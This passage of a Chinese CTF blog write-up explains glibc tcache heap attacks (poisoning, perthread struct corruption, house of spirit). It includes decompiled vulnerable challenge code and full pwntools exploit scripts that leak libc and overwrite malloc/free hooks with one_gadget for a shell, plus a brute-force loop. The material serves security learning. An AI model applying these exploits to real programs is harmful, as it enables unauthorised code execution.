sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(3))</span><br><span class="line">        sh.recvuntil(&#39;&gt; &#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">for i in range(6):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(9)  #防止free的时候和top chunk合并</span><br><span class="line"></span><br><span class="line">for i in range(6,9):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"># now the heap</span><br><span class="line"># tcache-0</span><br><span class="line"># tcache-1</span><br><span class="line"># tcache-2</span><br><span class="line"># tcache-3</span><br><span class="line"># tcache-4</span><br><span class="line"># tcache-5</span><br><span class="line"># unsorted - 6</span><br><span class="line"># unsorted - 7</span><br><span class="line"># unsorted - 8</span><br><span class="line"># tcache-9</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;aa&#39;)#7</span><br><span class="line">add(0x20,&#39;bb&#39;)#8</span><br><span class="line">add(0x20,&#39;cc&#39;)#9</span><br><span class="line"></span><br><span class="line"># now the heap </span><br><span class="line"># chunk-6</span><br><span class="line"># chunk-5</span><br><span class="line"># chunk-4</span><br><span class="line"># chunk-3</span><br><span class="line"># chunk-2</span><br><span class="line"># chunk-1</span><br><span class="line"># chunk - 7</span><br><span class="line"># chunk - 8</span><br><span class="line"># chunk - 9</span><br><span class="line"># chunk-0</span><br><span class="line"></span><br><span class="line">for i in range(6):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)  #chunk-8和chunk-9合并，使chunk-9的prev_size&#x3D;0x200</span><br><span class="line"></span><br><span class="line">add(0xf8, str(8)*0x7) #将chunk-9的size位的P位置0</span><br><span class="line">delete(6)</span><br><span class="line">delete(9)  #合并chunk-7,8,9</span><br><span class="line"></span><br><span class="line"># now the heap</span><br><span class="line"># chunk-6   tcache</span><br><span class="line"># chunk-5   tcache</span><br><span class="line"># chunk-4   tcache</span><br><span class="line"># chunk-3   tcache</span><br><span class="line"># chunk-2   tcache</span><br><span class="line"># chunk-1   tcache</span><br><span class="line"># chunk - 7 unsorted     |</span><br><span class="line"># chunk - 8 use 0        |---&gt;free</span><br><span class="line"># chunk - 9 unsorted     |</span><br><span class="line"># chunk-0   tcache</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;a&#39;) #8</span><br><span class="line"></span><br><span class="line">#chunk1</span><br><span class="line">#chunk2</span><br><span class="line">#chunk3</span><br><span class="line">#chunk3</span><br><span class="line">#chunk4</span><br><span class="line">#chunk5</span><br><span class="line">#chunk6</span><br><span class="line">#chunk8 </span><br><span class="line">#chunk0 unsorted and use</span><br><span class="line">#chunk7</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line"></span><br><span class="line">main_area&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;main_area : &#39; +hex(main_area))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;main_area-libc.symbols[&#39;__malloc_hook&#39;]-0x70</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#libc_base &#x3D; main_area - 0x3ebca0          vmmap -&gt; main_arena-vmmap_libc-offest</span><br><span class="line">#sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#one_gadget&#x3D;0x4f365,0x4f3c2,0x10a45c</span><br><span class="line"></span><br><span class="line">add(0x20,&#39;L0ne1y&#39;) #0 9</span><br><span class="line"></span><br><span class="line"># now the heap</span><br><span class="line"># chunk-1</span><br><span class="line"># chunk-2</span><br><span class="line"># chunk-3</span><br><span class="line"># chunk-4</span><br><span class="line"># chunk-5</span><br><span class="line"># chunk-6</span><br><span class="line"># chunk-8</span><br><span class="line"># chunk-0 chunk-9</span><br><span class="line">#</span><br><span class="line"># chunk-7</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">delete(9)</span><br><span class="line"></span><br><span class="line">free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f3c2</span><br><span class="line">sh.success(&#39;free_hook : &#39; +hex(free_hook))</span><br><span class="line">sh.success(&#39;one_gadget : &#39;+hex(one_gadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x20,p64(free_hook))</span><br><span class="line">add(0x20,&#39;L0ne1y&#39;)</span><br><span class="line">add(0x20,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>同样，由于tcache_put函数在把chunk放入tcache Bin时没有做过多检查，我们可以在释放一个chunk将其放入tcache后，直接修改其fd指针为<strong>任意地址处</strong>，比fastbin attack更易利用的是我们无需构造fake_fastbin_size以绕过检查，便可直接将任意地址处插入到tcache Bin中。因此，常与其他漏洞利用方式，例如：off by one等结合，用来在最后劫持程序流到one_gadget程序段或system等函数处。下面通过详细分析一道例题进行进一步说明：</p>
<h3 id="HITCON-2018-PWN-baby-tcache（CTF-WIKI）"><a href="#HITCON-2018-PWN-baby-tcache（CTF-WIKI）" class="headerlink" title="HITCON 2018 PWN baby_tcache（CTF WIKI）"></a>HITCON 2018 PWN baby_tcache（CTF WIKI）</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-1"><a href="#main函数如下：-1" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; rax@2</span><br><span class="line"></span><br><span class="line">  sub_AAB();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_BFF();</span><br><span class="line">      v3 &#x3D; read_number();</span><br><span class="line">      if ( v3 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &#x3D;&#x3D; 3 )</span><br><span class="line">      _exit(0);</span><br><span class="line">    if ( v3 &#x3D;&#x3D; 1 )</span><br><span class="line">      add();</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;Invalid Choice&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下：-1"><a href="#add函数如下：-1" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; &#x2F;&#x2F; rax@7</span><br><span class="line">  signed int i; &#x2F;&#x2F; [sp+Ch] [bp-14h]@1</span><br><span class="line">  _BYTE *v3; &#x2F;&#x2F; [sp+10h] [bp-10h]@5</span><br><span class="line">  unsigned __int64 size; &#x2F;&#x2F; [sp+18h] [bp-8h]@3</span><br><span class="line"></span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( i &gt; 9 )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) &#x3D; puts(&quot;:(&quot;);</span><br><span class="line">      return (unsigned __int64)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !ptr[i] )</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Size:&quot;);</span><br><span class="line">  size &#x3D; read_number();</span><br><span class="line">  if ( size &gt; 0x2000 )</span><br><span class="line">    exit(-2);</span><br><span class="line">  v3 &#x3D; malloc(size);</span><br><span class="line">  if ( !v3 )</span><br><span class="line">    exit(-1);</span><br><span class="line">  printf(&quot;Data:&quot;);</span><br><span class="line">  sub_B88((__int64)v3, size);</span><br><span class="line">  v3[size] &#x3D; 0;                                 &#x2F;&#x2F; off by one</span><br><span class="line">  ptr[i] &#x3D; v3;</span><br><span class="line">  v0 &#x3D; size_arr;</span><br><span class="line">  size_arr[i] &#x3D; size;</span><br><span class="line">  return (unsigned __int64)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete函数如下："><a href="#delete函数如下：" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v1; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index:&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &gt; 9 )</span><br><span class="line">    exit(-3);</span><br><span class="line">  if ( ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(ptr[v1], 218, size_arr[v1]);</span><br><span class="line">    free(ptr[v1]);</span><br><span class="line">    ptr[v1] &#x3D; 0LL;</span><br><span class="line">    size_arr[v1] &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;:)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序存在<code>off-by-one</code>漏洞，但是没有show函数，没有办法泄露libc，考虑使用IO_file攻击泄露libc。</p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><ol>
<li>首先触发unlink，构造堆块重叠。</li>
<li>将unsorted chunk移动到chunk2部分，然后覆盖后三位地址为<code>IO_2_1_stdout</code>,这里覆盖后四位<code>\x60\x07</code>，所以<code>\x07</code>的0是随机的。</li>
<li>然后申请俩次chunk将<code>IO_2_1_stdout</code>申请出来，然后修改stdout的flag位为<code>0xfbad1800</code>和<code>_IO_write_base</code>的最后一个字节，接收libc地址。这里为什么是0x3e，没有懂。qaq</li>
<li>将chunk地址改为free_hook地址，写入one_gadget</li>
<li>最后free(0)来getshell</li>
</ol>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;baby_tcache&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;baby_tcache&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size,content) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;1&#39;)</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;2&#39;)</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def exit() :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;3&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0X500-0X8,&#39;l0ne1y&#39;) #0</span><br><span class="line">add(0x30,&#39;L0ne1y&#39;) #1</span><br><span class="line">add(0x40,&#39;L0ne1y&#39;) #2</span><br><span class="line">add(0x50,&#39;L0ne1y&#39;) #3</span><br><span class="line">add(0x60,&#39;L0ne1y&#39;) #4</span><br><span class="line">add(0x500-0x8,&#39;L0ne1y&#39;) #5</span><br><span class="line">add(0x70,&#39;L0ne1y&#39;) #6</span><br><span class="line">free(4)</span><br><span class="line">add(0x68,&#39;a&#39;*0x60+&#39;\x60\x06&#39;) #4</span><br><span class="line">free(2)</span><br><span class="line">free(0)</span><br><span class="line">free(5)  #chunk merge</span><br><span class="line"></span><br><span class="line">add(0x530,&#39;L0ne1y&#39;) #0(0+1)</span><br><span class="line">free(4)</span><br><span class="line">add(0xa0,&#39;\x60\x07&#39;) #2(2+3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x40,&#39;L0ne1y&#39;) #4</span><br><span class="line">add(0x3e,p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;) #5</span><br><span class="line"></span><br><span class="line">sh.recv(8)</span><br><span class="line">IO_stdout &#x3D; u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;IO_stdout : &#39; +hex(IO_stdout))</span><br><span class="line">#0x7ffff7dd18b0-0x7ffff79e4000&#x3D;0x3ed8b0</span><br><span class="line">libc_base &#x3D; IO_stdout - 0x3ed8b0</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#one_gadget&#x3D;0x4f3c2,0x10a45c</span><br><span class="line">free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]</span><br><span class="line">sh.success(&#39;free_hook : &#39; +hex(free_hook))</span><br><span class="line">add(0xa0,p64(free_hook)) #tcache4-&gt;free_hook</span><br><span class="line"></span><br><span class="line">add(0x60,&#39;L0ne1y&#39;)</span><br><span class="line">one_gadget&#x3D;libc_base+0x4f3c2</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">add(0x60,p64(one_gadget))</span><br><span class="line">free(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本："><a href="#爆破脚本：" class="headerlink" title="爆破脚本："></a>爆破脚本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 20&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>



<h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>在堆题中，我们常见的一种泄露地址的方法是泄露<code>unsortedbin</code>中chunk的<code>fd</code>和<code>bk</code>，而在严格限制chunk大小的堆题中，如果有<code>tcache</code>机制的影响，我们必须需要先将<code>tcache Bin</code>填满，才能把chunk放入<code>unsortedbin</code>中，再进行地址泄露。于是，有些堆题会对<code>malloc</code>和<code>free</code>操作的次数设定限制，这时我们可以考虑伪造<code>tcache</code>机制的主体<code>tcache_perthread_struct</code>结构体。在源代码中对其定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>        </span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];     <span class="comment">//数组counts用于存放每个bins中的chunk数量</span></span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];   <span class="comment">//数组entries用于放置64个bins</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>tcache_perthread_struct</code>结构体首先是类型为char（一个字节）的counts数组，用于存放64个bins中的chunk数量，随后依次是对应size大小<code>0x20-0x410</code>的64个entries（8个字节），用于存放64个bins的Bin头地址。做一道例题来练习一下：</p>
<h3 id="buuoj-–-V-amp-N2020-公开赛-easyTHeap"><a href="#buuoj-–-V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="buuoj – [V&amp;N2020 公开赛]easyTHeap"></a>buuoj – [V&amp;N2020 公开赛]easyTHeap</h3><h4 id="checksec检查-1"><a href="#checksec检查-1" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-2"><a href="#main函数如下：-2" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; [sp+Ch] [bp-4h]@2</span><br><span class="line"></span><br><span class="line">  sub_A39();</span><br><span class="line">  puts(&quot;Welcome to V&amp;N challange!&quot;);</span><br><span class="line">  puts(&quot;This&#39;s a tcache heap for you.&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_DCF();</span><br><span class="line">    v3 &#x3D; read_number();</span><br><span class="line">    if ( (unsigned int)v3 &lt;&#x3D; 5 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;Please input current choice.&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(__CS__, (char *)dword_1090 + dword_1090[(unsigned __int64)(unsigned int)v3]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add函数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int add()</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax@2</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line">  int v2; &#x2F;&#x2F; [sp+Ch] [bp-4h]@3</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; sub_AB2();</span><br><span class="line">  if ( v1 &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;size?&quot;);</span><br><span class="line">    result &#x3D; read_number();</span><br><span class="line">    v2 &#x3D; result;</span><br><span class="line">    if ( result &gt; 0 &amp;&amp; result &lt;&#x3D; 256 )</span><br><span class="line">    &#123;</span><br><span class="line">      chunk[v1] &#x3D; malloc(result);</span><br><span class="line">      if ( !chunk[v1] )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Something Wrong!&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">      &#125;</span><br><span class="line">      size[v1] &#x3D; v2;</span><br><span class="line">      result &#x3D; puts(&quot;Done!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下："><a href="#edit函数如下：" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;idx?&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !chunk[v1] )</span><br><span class="line">    exit(0);</span><br><span class="line">  printf(&quot;content:&quot;);</span><br><span class="line">  read(0, chunk[v1], size[v1]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="show函数如下：-1"><a href="#show函数如下：-1" class="headerlink" title="show函数如下："></a>show函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int show()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;idx?&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !chunk[v1] )</span><br><span class="line">    exit(0);</span><br><span class="line">  puts((const char *)chunk[v1]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete函数如下：-1"><a href="#delete函数如下：-1" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;idx?&quot;);</span><br><span class="line">  v1 &#x3D; read_number();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !chunk[v1] )</span><br><span class="line">    exit(0);</span><br><span class="line">  free(chunk[v1]);                              &#x2F;&#x2F; double free</span><br><span class="line">  size[v1] &#x3D; 0;</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><ol>
<li>首先利用double free 泄露堆地址</li>
<li>然后申请一个chunk修改fd指针为<code>tcache_perthread_struct</code>（tcache结构体被系统分配到了堆里），然后连续malloc拿到这个chunk</li>
<li>修改size数组为7，然后free一个chunk，这个chunk会被分配到unsorted bin里，我们就可以通过泄露main_arena来拿到libc_base。</li>
<li>通过修改结构体中entries数组的第一个内容，即size=0x20的chunk的tcache Bin头，再次申请0x10的chunk可以申请到指定地址的chunk，实现任意地址写</li>
<li>但是这里受次数限制我们不能写入free_hook，checksec查看可以看到<code>Full RELRO</code>保护开启，无法写入函数的got表，malloc函数的参数又是我们自己写入的，无法写入<code>&#39;/bin/sh&#39;</code>字符串，所以我们只能向<code>malloc_hook</code>中写入one_gadget地址，但是这里将可用的one_gadget全部尝试后发现均不满足条件，于是我们必须利用<code>realloc_hook</code>，通过libc中<code>realloc</code>函数前一系列的抬栈操作来满足one_gadget可以使用的条件.</li>
<li>同时<code>realloc_hook</code>与<code>malloc_hook</code>地址是连续的,因此我们劫持程序流至<code>realloc_hook</code>地址处，可以同时向两个hook地址中任意写，我们只需向<code>realloc_hook</code>中写入one_gadget，向<code>malloc_hook</code>中写入<code>realloc</code>地址加上适当的偏移（抬栈时push操作的次数不同，我们一般加上8即可），就可以在再次<code>malloc</code>时先去<code>realloc</code>函数处执行，抬栈后满足<code>one_gadget</code>的要求，再去执行<code>realloc_hook</code>中存放的<code>one_gadget</code>，进行getshell.</li>
</ol>
<h3 id="exp脚本："><a href="#exp脚本：" class="headerlink" title="exp脚本："></a>exp脚本：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;easyTheap&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;easyTheap&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(size) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;1&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def edit(index,content) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;2&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.send(str(index))</span><br><span class="line">    sh.recvuntil(&#39;:&#39;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line">def show(index) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;3&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.send(str(index))</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">    sh.recvuntil(&#39;: &#39;)</span><br><span class="line">    sh.sendline(&#39;4&#39;)</span><br><span class="line">    sh.recvuntil(&#39;?&#39;)</span><br><span class="line">    sh.send(str(index))</span><br><span class="line"></span><br><span class="line">add(0x80) #0</span><br><span class="line">add(0x10) #1</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line">show(0)     #-&gt;leak chunk_base</span><br><span class="line">chunk_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;chunk_addr : &#39; +hex(chunk_addr))</span><br><span class="line">chunk_base&#x3D;chunk_addr-0x250-0x10</span><br><span class="line">sh.success(&#39;chunk_base : &#39; +hex(chunk_base))</span><br><span class="line"></span><br><span class="line">add(0x80) #2</span><br><span class="line">edit(2,p64(chunk_base+0x10))</span><br><span class="line">add(0x80) #3</span><br><span class="line">add(0x80) #4  tcache_perthread_struct</span><br><span class="line">edit(4,&#39;\x00&#39;*7+&#39;\x07&#39;)</span><br><span class="line">free(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.success(&#39;main_arena : &#39; +hex(main_arena))</span><br><span class="line">#libc_base&#x3D;main_arena-0x3ebc40</span><br><span class="line">libc_base&#x3D;main_arena-libc.symbols[&#39;__malloc_hook&#39;]-0x70</span><br><span class="line">sh.success(&#39;libc_base : &#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget&#x3D;libc_base+0x10a45c</span><br><span class="line">sh.success(&#39;one_gadget : &#39; +hex(one_gadget))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">realloc_hook&#x3D;libc_base+libc.sym[&#39;__libc_realloc&#39;]</span><br><span class="line">sh.success(&#39;malloc_hook : &#39; +hex(malloc_hook))</span><br><span class="line">sh.success(&#39;realloc_hook : &#39; +hex(realloc_hook))</span><br><span class="line"></span><br><span class="line">edit(4,&#39;\x07&#39;*64+p64(malloc_hook-0x8))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x10) #5</span><br><span class="line">edit(5,p64(one_gadget)+p64(realloc_hook+8))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x20)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>与house of spirit的利用方式几乎相同(详见House of Spirit)，但是由于<code>tcache_put</code>函数几乎没有检查，因此构造fake tcache chunk内存时需要绕过的检查更加宽松，具体如下：</p>
<ol>
<li>fake chunk的size在tcache的范围中（64位程序中是32字节到410字节），且其ISMMAP位不为1</li>
<li>fake chunk的地址对齐</li>
</ol>
<p>这里不需要构造next chunk的size，也不需要考虑double free的情况，因为free堆块到tcache中的时候不会进行这些检查。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener external nofollow noreferrer">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/</a></p>
<p><a href="https://noonegroup.xyz/posts/f37fbe7f/" target="_blank" rel="noopener external nofollow noreferrer">https://noonegroup.xyz/posts/f37fbe7f/</a></p>
